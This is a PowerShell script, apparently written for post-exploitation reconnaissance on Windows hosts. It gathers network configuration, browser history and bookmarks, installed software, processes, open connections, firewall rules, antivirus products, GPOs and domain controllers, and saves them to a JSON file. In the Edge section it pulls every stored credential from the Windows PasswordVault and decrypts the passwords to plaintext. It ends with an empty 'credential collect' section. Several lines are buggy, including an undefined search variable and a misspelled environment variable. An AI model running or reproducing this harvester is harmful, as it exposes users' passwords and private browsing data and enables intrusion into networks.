
#------------- Network -------------#

# Get network adapters and select wireless adapters only
$adapters = Get-NetAdapter

# Get IP address, subnet mask, default gateway, and MAC address for each adapter
$adapterInfo = foreach ($adapter in $adapters)
{
  $ipconfig = Get-NetIPAddress -InterfaceIndex $adapter.ifIndex | Where-Object {$_.AddressFamily -eq "IPv4"}
  $ipAddress = $ipconfig.IPAddress
  $subnetMask = $ipconfig.PrefixLength
  $gateway = (Get-NetRoute -InterfaceIndex $adapter.ifIndex | Where-Object {$_.DestinationPrefix -eq "0.0.0.0/0.0.0.0"}).NextHop
  $macAddress = $adapter.MacAddress
  $dnsServers = (Get-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex).ServerAddresses

  # Output the information for this adapter
  [PSCustomObject]@{
    IPAddress = $ipAddress
    SubnetMask = $subnetMask
    DefaultGateway = $gateway
    MacAddress = $macAddress
    DnsServers = $dnsServers
  }
}

# Get configured proxy
$proxyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
$proxy = (Get-ItemProperty -Path $proxyPath).ProxyServer

# Get configured VPN
$vpn = Get-VpnConnection | Select-Object -ExpandProperty Name

# Get domain name
$domainName = ([System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()).DomainName

# Get computer name
$computerName = $env:COMPUTERNAME

# Net data request
$net = [PSCustomObject]@{
  adaptersInfo = $adapterInfo
  proxy = $proxy
  vpn = $vpn
  domainName = $domainName
  computerName = $computerName
}

#Miss wifi 


#------------- All-WebBrowser -------------#

$browserList = Get-ItemProperty HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -like "*chrome*" -or $_.DisplayName -like "*firefox*" -or $_.DisplayName -like "*edge*" }

$UserName = $end:UserName 
$browserDataList = @()
foreach ($browser in $browserList)
{
  $browserData = [PSCustomObject]@{
    Name = $browser.DisplayName
    version = $null
    addOns = $null
    certificates = $null
    identifiers = $null
    favorites = $null
    history = $null
  }

  if ($browser.UninstallString -like "*chrome*")
  {
    $browserData.version = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome" | Select-Object -ExpandProperty DisplayVersion

    $browserData.addOns = Get-ChildItem "$($env:LOCALAPPDATA)\Google\Chrome\User Data\Default\Extensions\" -Directory

    $browserName = $browser.DisplayName -replace '.*?(Chrome).*', '$1'
    $browserData.certificates = Get-ChildItem -Path "Cert:\CurrentUser\My" -Recurse |
      Where-Object { $_.Issuer -like "*$browserName*" -or $_.Subject -like "*$browserName*" }

    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
    if (Test-Path $path)
    {
      $browserData.favorites = (Get-Content $path | ConvertFrom-Json).roots.bookmark_bar.children |
        Where-Object { $_.type -eq "url" } |
        Select-Object name, url
    }

    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History" 
    if (-not (Test-Path -Path $Path))
    { 
      Write-Verbose "[!] Could not find Chrome History for username: $UserName" 
    } 
    $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' 
    $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
    $browserData.history = @()
    $Value | ForEach-Object { 
      $Key = $_ 
      if ($Key -match $Search)
      { 
        $browserData += New-Object -TypeName PSObject -Property @{ 
          User = $UserName 
          Browser = 'Chrome' 
          DataType = 'History' 
          Data = $_ 
        } 
      } 
    }


  } elseif ($browser.UninstallString -like "*firefox*")
  {
    $browserData.version = Get-ItemProperty "HKLM:\Software\Wow6432Node\Mozilla\Mozilla Firefox" | Select-Object -ExpandProperty CurrentVersion

    $browserData.addOns = Get-ChildItem "$($env:APPDATA)\Mozilla\Firefox\Profiles\*\extensions\" -Directory

    $browserName = $browser.DisplayName -replace '.*?(Firefox).*', '$1'
    $browserData.certificates = Get-ChildItem -Path "Cert:\CurrentUser\My" -Recurse |
      Where-Object { $_.Issuer -like "*$browserName*" -or $_.Subject -like "*$browserName*" }

    $path = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $path)
    {
      $profileData = Get-ChildItem $path | Select-Object -First 1
      if ($profileData)
      {
        $file = "$($profileData.FullName)\places.sqlite"
        $favorites = @()
        if (Test-Path $file)
        {
          $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$file;Version=3;"
          $connection.Open()
          $command = $connection.CreateCommand()
          $command.CommandText = "SELECT moz_bookmarks.title, moz_places.url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id WHERE moz_bookmarks.type = 1"
          $reader = $command.ExecuteReader()
          while ($reader.Read())
          {
            $favorites += @{
              name = $reader.GetString(0)
              url  = $reader.GetString(1)
            }
          }
          $browserData.favorites = $favorites
          $reader.Close()
          $connection.Close()
        }
      }


      $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
      if (-not (Test-Path -Path $Path))
      {
        Write-Verbose "[!] Could not find FireFox History for username: $UserName"
      } else
      {
        $Profiles = Get-ChildItem -Path "$Path\*.default\" -ErrorAction SilentlyContinue
        $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches |Select-Object -ExpandProperty Matches |Sort -Unique
        $browserData.history = @()
        $Value.Value |ForEach-Object {
          if ($_ -match $Search)
          {
            ForEach-Object {
              $browserData.history += New-Object -TypeName PSObject -Property @{
                User = $UserName
                Browser = 'Firefox'
                DataType = 'History'
                Data = $_
              }    
            }
          }
        }
      }
    }


  } elseif ($browser.UninstallString -like "*edge*")
  {
    $browserData.version = Get-AppxPackage Microsoft.Edge | Select-Object -ExpandProperty Version

    Write-Host Get-AppxPackage Microsoft.Edge | Select-Object -ExpandProperty Version

    $browserData.addOns = Get-ChildItem "$($env:LOCALAPPDATA)\Microsoft\Edge\User Data\Default\Extensions\" -Directory

    $browserName = $browser.DisplayName -replace '.*?(Edge).*', '$1'
    $browserData.certificates = Get-ChildItem -Path "Cert:\CurrentUser\My" -Recurse |
      Where-Object { $_.Issuer -like "*$browserName*" -or $_.Subject -like "*$browserName*" }

    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Favorites"
    if (Test-Path $path)
    {
      $favorites = Get-ChildItem $path -Recurse |
        Where-Object { $_.Extension -eq ".url" } |
        ForEach-Object {
          $content = Get-Content $_.FullName
          $name = ($content -match "^(?i)Title=(.*)$")[1]
          $url = ($content -match "^(?i)URL=(.*)$")[1]
          @{
            name = $name
            url  = $url
          }
        }
    }


    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\History" 
    if (-not (Test-Path -Path $Path))
    { 
      Write-Verbose "[!] Could not find Edge History for username: $UserName" 
    } 
    $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' 
    $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Microsoft\Edge\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
    $browserData.history = @()
    $Value | ForEach-Object { 
      $Key = $_ 
      if ($Key -match $Search)
      { 
        $browserData.history = New-Object -TypeName PSObject -Property @{ 
          User = $UserName 
          Browser = 'Edge' 
          DataType = 'History' 
          Data = $_ 
        } 
      } 
    }
  
    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $browser.identifiers = $vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword();$_ } | Select-Object username,resource,password

  }
  $browserDataList += $browserData
}

#------------- Longon cached -------------#

# Get the currently connected user accounts
$connectedAccounts = Get-LocalUser | Where-Object { $_.Enabled -eq $true}

# Get the cached accounts on the local machine
$cachedAccounts = Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true }

$accounts = [PSCustomObject]@{
  logged = $connectedAccounts
  cached = $cachedAccounts
}

#------------- Applications Information -------------#

# Get a list of installed applications
$applications32Path = "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
$applicationsPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" 
$applications = Get-ItemProperty $applications32Path, $applicationsPath|
  Where-Object { $_.DisplayName -and !$_.SystemComponent } |
  Select-Object DisplayName, Publisher, DisplayVersion

#------------- Start Menu -------------#

# Get information of start menu
$startMenuPath = "$env:APPDATA\Microsoft\Windows\Start Menu"
$startMenuItems = Get-ChildItem -Path $startMenuPath -Recurse | Where-Object { $_.Name -notlike "desktop.ini" }

#------------- Scheduled Tasks -------------#

# Get a list of scheduled tasks
$scheduledTasks = Get-ScheduledTask | Select-Object TaskName, TaskPath, State, LastRunTime, NextRunTime

#------------- Active Process -------------#

# Get a list of active process
$activeProcess = Get-Process | Select-Object Id,Name,MainWindowTitle

#------------- Activeport -------------#

# Get a list of active port
$activeTCPPorts = Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort

#------------- Security -------------#

# Get Os information
$os = Get-CimInstance Win32_OperatingSystem

$osInformations = [PSCustomObject]@{
  osCaption = $os.Caption
  osVersion = $os.Version
  osBuild = $os.BuildNumber
}

$servicePack = [PSCustomObject]@{
  majorVersion = $os.ServicePackMajorVersion
  minorVersion = $os.ServicePackMinorVersion
}

# Retrieve the active firewall profile
$firewall = Get-NetFirewallProfile -Profile Domain, Public, Private

# Retrieve the active firewall rules for the profile
$rules = $firewall | Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"}

# Save the active NAT and filter rules
$natRules = $rules | Where-Object {$_.Action -eq "Allow" -and $_.Direction -eq "Inbound" -and $_.EdgeTraversalPolicy -eq "Allow" -and $_.Protocol -eq "TCP"}
$filterRules = $rules | Where-Object {$_.Action -eq "Allow" -and $_.Direction -eq "Inbound" -and $_.Protocol -eq "TCP" -and $_.Program -ne $null}

$firewallRules = [PSCustomObject]@{
  natRules = $natRules
  filterRules = $filterRules
}

# Retrieve the list of installed antivirus software
$antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
$antivirusList = New-Object System.Collections.ArrayList
# Save the name and version of each installed antivirus software
Write-Output "Installed antivirus software:"
foreach ($av in $antivirus)
{
  $currentAntivirus = [PSCustomObject]@{
    name = $av.displayName
    version = $av.displayVersion
  }
  $antivirusList.Add($currentAntivirus)
}

# Retrieve the current SRP or AppLocker configuration
$configSRP = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "SecurityCenter2" |
  Select-Object AppLockerEnabled, IsSoftwareRestrictionPolicyEnforced


# Retrieve the list of applied GPOs
$gpos = Get-GpResultantSetOfPolicy -ReportType Computer -ErrorAction SilentlyContinue

$GPOInformations = New-Object System.Collections.ArrayList
foreach ($gpo in $gpos.AppliedGPOs)
{
  $currentGPO = [PSCustomObject]@{
    name = $gpo.DisplayName
    id = $gpo.GPOID
  }
  $GPOInformations.Add($currentGPO)
}

$domainControllersList = New-Object System.Collections.ArrayList

# Retrieve the list of domain controllers
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainControllers = $domain.DomainControllers

# save the list of domain controllers with names and IP addresses
Write-Output "Domain Controllers:"
foreach ($dc in $domainControllers)
{
  $ip = ([System.Net.Dns]::GetHostAddresses($dc.Name) | Where-Object { $_.AddressFamily -eq "InterNetwork" }).IPAddressToString
  $currentDc = [PSCustomObject]@{
    name = $dc.name
    ip = $ip
  }
  $domainControllersList.Add($currentDc)
}



$security = [PSCustomObject]@{
  os = $osInformations
  servicePack = $servicePack
  patches = Get-HotFix | Select-Object -Property Description, HotFixId
  firewallRules = $firewallRules
  antivirus = $antivirusList
  appLockerEnabled = $configSRP.appLockerEnabled
  SRPEnforced = $configSRP.IsSoftwareRestrictionPolicyEnforced
  GPOs = $GPOInformations
  domainControllers = $domainControllersList
}
#------------- Export json -------------#

# Recap object
$finalObject = [PSCustomObject]@{
  net = $net
  WebBrowser = $browserDataList
  accounts = $accounts
  applications = $applications
  startMenu = $startMenuItems
  scheduledTasks = $scheduledTasks
  activeProcess = $activeProcess
  activePort = $activeTCPPorts
  Security = $security
}

# Save data as json file
ConvertTo-Json $finalObject | Set-Content result.json


#------------- Crendential Collect -------------#
